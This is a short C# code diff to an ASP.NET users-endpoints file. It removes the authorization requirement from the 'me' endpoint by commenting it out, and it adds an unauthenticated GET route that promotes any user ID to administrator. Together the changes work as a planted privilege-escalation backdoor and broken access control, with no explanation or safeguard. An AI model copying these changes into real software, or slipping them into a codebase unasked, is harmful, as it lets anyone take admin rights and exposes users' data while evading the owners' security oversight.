@@ -16,8 +16,10 @@ public static class UsersEndpoints
         
         endpoints.MapPost("login", Login);
 
-        endpoints.MapGet("me", GetMe)
-            .RequireAuthorization();
+        endpoints.MapGet("me", GetMe);
+            // .RequireAuthorization();
+        
+        endpoints.MapGet("users/{userId}/promote", PromoteUser);
         
         return endpoints;
     }
@@ -43,6 +45,13 @@ public static class UsersEndpoints
         var token = await usersService.Login(request.Email, request.Password);
         
         context.Response.Cookies.Append("cookies", token);
+        
+        return Results.Ok();
+    }
+    
+    private static async Task<IResult> PromoteUser(string userId, UsersService usersService)
+    {
+        await usersService.PromoteToAdmin(Guid.Parse(userId));
         
         return Results.Ok();
     }
